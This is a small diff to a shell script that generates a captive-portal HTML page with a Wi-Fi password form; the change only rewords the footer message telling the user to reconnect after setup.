@@ -228,7 +228,7 @@ cat << 'EOF' > /www/captive-portal/index.html
             <input type="password" name="password" placeholder="Wi-Fi Password" required>
             <button type="submit">Save & Connect</button>
         </form>
-        <div class="footer">Your connection will start automatically after setup.</div>
+        <div class="footer">After setting up the credentials, please connect again.</div>
     </div>
 </body>
 </html>
